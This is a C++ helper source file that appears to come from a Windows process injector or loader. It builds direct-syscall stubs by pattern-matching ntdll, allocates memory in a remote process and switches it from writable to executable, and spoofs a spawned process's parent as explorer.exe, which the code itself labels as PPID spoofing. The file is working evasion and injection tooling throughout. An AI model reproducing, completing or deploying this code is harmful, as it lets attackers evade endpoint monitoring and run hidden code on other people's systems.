#include "utils.h"
#include <cstdio>
#include <iostream>
#include <Psapi.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#define LLOG(...) Log(__VA_ARGS__)
static void* g_firstStub = nullptr;         

bool InitSyscalls()
{
    LLOG("[ENTER] InitSyscalls()");
    HMODULE nt = GetModuleHandleW(L"ntdll.dll");
    LLOG("[DBG] GetModuleHandleW(\"ntdll.dll\") returned %p", nt);
    if (!nt) {
        LLOG("[ERROR] InitSyscalls: ntdll.dll not loaded");
        return false;
    }

    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(nt);
    auto nth = reinterpret_cast<PIMAGE_NT_HEADERS>((BYTE*)nt + dos->e_lfanew);
    auto firstSection = IMAGE_FIRST_SECTION(nth);
    PIMAGE_SECTION_HEADER textSec = nullptr;
    for (WORD i = 0; i < nth->FileHeader.NumberOfSections; ++i) {
        if (memcmp(firstSection[i].Name, ".text", 5) == 0) {
            textSec = &firstSection[i];
            break;
        }
    }
    if (!textSec) {
        LLOG("[ERROR] InitSyscalls: .text section not found");
        return false;
    }

    BYTE* start = (BYTE*)nt + textSec->VirtualAddress;
    SIZE_T len  = max(textSec->Misc.VirtualSize, textSec->SizeOfRawData);
    BYTE* end   = start + len;
    LLOG("[DBG] Scanning .text: %p … %p (%zu bytes)", start, end, len);

#if defined(_WIN64)
    //  4C 8B D1              ; mov r10, rcx
    //  B8 xx xx xx xx        ; mov eax, imm32
    //  0F 05                 ; syscall
    //  C3                    ; ret
    const SIZE_T patternLen = 4 /*mov*/ + 4 /*imm32*/ + 2 /*syscall*/ + 1 /*ret*/;
    for (BYTE* p = start; p + patternLen <= end; ++p) {
        if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8
            && p[4+4] == 0x0F && p[4+5] == 0x05
            && p[4+6] == 0xC3)
        {
            g_firstStub = p;
            LLOG("[OK] InitSyscalls: full syscall stub found at %p", p);
            return true;
        }
    }
#else
    // x86 sysenter + ret
    // B8 xx xx xx xx        ; mov eax, id
    // BA 00 03 FE 7F        ; mov edx, KUSER_SHARED_DATA+0x300
    // 0F 34                 ; sysenter
    // C3                    ; ret
    const SIZE_T patternLen = 1 /*mov eax*/ + 4 /*imm32*/ + 5 /*mov edx*/ + 2 /*sysenter*/ + 1 /*ret*/;
    for (BYTE* p = start; p + patternLen <= end; ++p) {
        if (p[0] == 0xB8
            && p[5] == 0xBA && p[6] == 0x00 && p[7] == 0x03 && p[8] == 0xFE && p[9] == 0x7F
            && p[10] == 0x0F && p[11] == 0x34
            && p[12] == 0xC3)
        {
            g_firstStub = p;
            LLOG("[OK] InitSyscalls: x86 syscall stub found at %p", p);
            return true;
        }
    }
#endif

    LLOG("[ERROR] InitSyscalls: stub signature not found in .text");
    return false;
}

void* BuildSysStub(DWORD id)
{
#ifdef _WIN64
    static const BYTE tmpl[] = {
        0x4C,0x8B,0xD1,              // mov r10, rcx
        0xB8,0,0,0,0,                // mov eax, id
        0x0F,0x05,                   // syscall
        0xC3                         // ret
    };
    const SIZE_T OFF_ID = 4;

#else   // x86
    static const BYTE tmpl[] = {
        0xB8,0,0,0,0,                // mov eax, id
        0xBA,0x00,0x03,0xFE,0x7F,    // mov edx, 0x7FFE0300
        0x0F,0x34,                   // sysenter
        0xC3                         // ret
    };
    const SIZE_T OFF_ID = 1;
#endif

    BYTE* buf = (BYTE*)VirtualAlloc(nullptr, sizeof(tmpl),
                                    MEM_COMMIT, PAGE_READWRITE);
    if (!buf) { LLOG("[!] BuildSysStub: VirtualAlloc failed"); return nullptr; }

    memcpy(buf, tmpl, sizeof(tmpl));
    *reinterpret_cast<DWORD*>(buf + OFF_ID) = id;

    DWORD old; VirtualProtect(buf, sizeof(tmpl), PAGE_EXECUTE_READ, &old);
    LLOG("[DBG] stub for id %u @%p", id, buf);
    return buf;
}

PVOID RemoteHeap::alloc(SIZE_T bytes)
{
    PVOID p = nullptr;
    auto NtAlloc = GetNt<NTSTATUS (NTAPI*)(HANDLE,PVOID*,ULONG_PTR,
                                           SIZE_T*,ULONG,ULONG)>("NtAllocateVirtualMemory");
    if (NT_SUCCESS(NtAlloc(hProc,&p,0,&bytes,MEM_COMMIT,PAGE_READWRITE)))
    {
        blocks.push_back({p,bytes});
        LLOG("[DBG] RemoteAlloc +%zu @%p", (size_t)bytes, p);
        return p;
    }
    LLOG("[!] RemoteAlloc failed (%zu)", (size_t)bytes);
    return nullptr;
}

void RemoteHeap::protectRX(PVOID base, SIZE_T bytes)
{
    auto NtProt  = GetNt<NTSTATUS (NTAPI*)(HANDLE,PVOID*,SIZE_T*,ULONG,PULONG)>
                   ("NtProtectVirtualMemory");
    auto NtFlush = GetNt<NTSTATUS (NTAPI*)(HANDLE,const void*,SIZE_T)>
                   ("NtFlushInstructionCache");
    ULONG old{};
    NtProt(hProc,&base,&bytes,PAGE_EXECUTE_READ,&old);
    NtFlush(hProc,base,bytes);
    LLOG("[DBG] RemoteProtect %zu @%p  RW→RX", (size_t)bytes, base);
}

void RemoteHeap::freeAll()
{
    if (blocks.empty()) return;

    auto NtFree = GetNt<NTSTATUS (NTAPI*)(HANDLE,PVOID*,SIZE_T*,ULONG)>
                  ("NtFreeVirtualMemory");

    SIZE_T freed = 0;
    for (auto& b : blocks)
    {
        SIZE_T z = 0;
        NtFree(hProc,&b.first,&z,MEM_RELEASE);
        freed += b.second;
    }
    LLOG("[DBG] RemoteFreeAll: %zu bytes", (size_t)freed);
    blocks.clear();
}

bool BuildSiWithExplorerParent(STARTUPINFOEXW& si, HANDLE& hParent)
{
    LLOG("[TRACE] BuildSiWithExplorerParent: entry");

    // Snapshot all processes
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        LLOG("[ERROR] BuildSiWithExplorerParent: CreateToolhelp32Snapshot failed (err=%lu)", GetLastError());
        return false;
    }
    LLOG("[TRACE] Snapshot created: handle=%p", snap);

    // Iterate to find explorer.exe
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    DWORD explorerPID = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            LLOG("[TRACE] Enumerating process: %ls (PID=%u)", pe.szExeFile, pe.th32ProcessID);
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                explorerPID = pe.th32ProcessID;
                LLOG("[DBG] Found explorer.exe PID=%u", explorerPID);
                break;
            }
        } while (Process32NextW(snap, &pe));
    } else {
        LLOG("[ERROR] BuildSiWithExplorerParent: Process32FirstW failed (err=%lu)", GetLastError());
    }
    CloseHandle(snap);

    if (!explorerPID) {
        LLOG("[DBG] BuildSiWithExplorerParent: explorer.exe not found");
        return false;
    }

    // Open explorer process for PPID spoofing
    LLOG("[TRACE] Opening explorer.exe for PPID spoof (PID=%u)", explorerPID);
    hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPID);
    if (!hParent) {
        LLOG("[ERROR] BuildSiWithExplorerParent: OpenProcess failed for PID=%u (err=%lu)", explorerPID, GetLastError());
        return false;
    }
    LLOG("[DBG] OpenProcess succeeded: hParent=%p", hParent);

    // Determine required size for attribute list
    SIZE_T attrListSize = 0;
    InitializeProcThreadAttributeList(nullptr, 1, 0, &attrListSize);
    LLOG("[TRACE] Required attribute list size = %zu", attrListSize);

    // Allocate and initialize the attribute list
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
    if (!si.lpAttributeList) {
        LLOG("[ERROR] BuildSiWithExplorerParent: HeapAlloc failed (size=%zu, err=%lu)", attrListSize, GetLastError());
        CloseHandle(hParent);
        return false;
    }
    LLOG("[TRACE] Allocated attribute list at %p", si.lpAttributeList);

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrListSize)) {
        LLOG("[ERROR] BuildSiWithExplorerParent: InitializeProcThreadAttributeList failed (err=%lu)", GetLastError());
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);
        return false;
    }
    LLOG("[DBG] InitializeProcThreadAttributeList succeeded");

    // Set the parent process attribute
    BOOL ok = UpdateProcThreadAttribute(
        si.lpAttributeList,
        0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent,
        sizeof(hParent),
        nullptr,
        nullptr
    );
    if (!ok) {
        LLOG("[ERROR] BuildSiWithExplorerParent: UpdateProcThreadAttribute failed (err=%lu)", GetLastError());
        DeleteProcThreadAttributeList(si.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        CloseHandle(hParent);
        return false;
    }
    LLOG("[DBG] PPID spoof: Set explorer.exe (PID=%u) as parent process", explorerPID);

    LLOG("[TRACE] BuildSiWithExplorerParent: exit → success");
    return true;
}

void FreeSiAttributes(STARTUPINFOEXW& si, HANDLE hParent)
{
    LLOG("[TRACE] FreeSiAttributes: entry (si.lpAttributeList=%p, hParent=%p)", 
         si.lpAttributeList, hParent);

    if (si.lpAttributeList) {
        LLOG("[TRACE] FreeSiAttributes: deleting attribute list at %p", si.lpAttributeList);
        DeleteProcThreadAttributeList(si.lpAttributeList);
        LLOG("[TRACE] FreeSiAttributes: heap freeing attribute list memory");
        HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
        si.lpAttributeList = nullptr;
        LLOG("[DBG] FreeSiAttributes: lpAttributeList reset to nullptr");
    } else {
        LLOG("[TRACE] FreeSiAttributes: no attribute list to delete");
    }

    if (hParent) {
        LLOG("[TRACE] FreeSiAttributes: closing parent handle %p", hParent);
        CloseHandle(hParent);
        LLOG("[DBG] FreeSiAttributes: parent handle closed");
    } else {
        LLOG("[TRACE] FreeSiAttributes: no parent handle to close");
    }

    LLOG("[DBG] PPID spoof: attributes freed");
}

bool CheckArchMatch(HANDLE hProc, PIMAGE_NT_HEADERS nt, std::string& err)
{
    LLOG("[TRACE] CheckArchMatch: entry (hProc=%p, ImageMachine=0x%X)", hProc, nt->FileHeader.Machine);

    using PFN_WOW64 = BOOL (WINAPI*)(HANDLE, USHORT*, USHORT*);
    HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
    LLOG("[TRACE] CheckArchMatch: kernel32.dll base = %p", hKernel);

    PFN_WOW64 pIsWow64Process2 = nullptr;
    if (hKernel) {
        pIsWow64Process2 = reinterpret_cast<PFN_WOW64>(
            GetProcAddress(hKernel, "IsWow64Process2"));
        LLOG("[TRACE] CheckArchMatch: IsWow64Process2 addr = %p", pIsWow64Process2);
    } else {
        LLOG("[WARN] CheckArchMatch: failed to get kernel32.dll module");
    }

    USHORT nativeMachine = 0, processMachine = 0;
    if (pIsWow64Process2) {
        BOOL wowRes = pIsWow64Process2(hProc, &nativeMachine, &processMachine);
        LLOG("[TRACE] CheckArchMatch: IsWow64Process2 returned %d (native=0x%X, proc=0x%X)",
             wowRes, nativeMachine, processMachine);
        if (wowRes != TRUE) {
            LLOG("[WARN] CheckArchMatch: IsWow64Process2 call failed, falling back to manual check");
        }
    } else {
        LLOG("[WARN] CheckArchMatch: IsWow64Process2 not available, using manual check");
    }

    // Determine target and image bitness
    bool target64 = (processMachine == IMAGE_FILE_MACHINE_AMD64);
    bool image64  = (nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64);
    LLOG("[TRACE] CheckArchMatch: target64=%d, image64=%d", target64, image64);

    if (target64 != image64) {
        err = "Architecture mismatch";
        LLOG("[ERROR] CheckArchMatch: architecture mismatch (target64=%d image64=%d)",
             target64, image64);
        return false;
    }

    LLOG("[TRACE] CheckArchMatch: architectures match");
    return true;
}

// Logger 
void EnsureConsole()
{
    static bool initialized = false;
    if (initialized) return;

    if (!AttachConsole(ATTACH_PARENT_PROCESS))
        AllocConsole();

    FILE* _;
    freopen_s(&_, "CONOUT$", "w", stdout);
    freopen_s(&_, "CONOUT$", "w", stderr);

    std::ios::sync_with_stdio(false);
    initialized = true;
}

void Log(const char* fmt, ...)
{
    char buf[1024];

    va_list ap; va_start(ap, fmt);
    _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, ap);
    va_end(ap);

    OutputDebugStringA(buf);
    OutputDebugStringA("\n");

    EnsureConsole();
    printf("%s\n", buf);
    fflush(stdout);
}
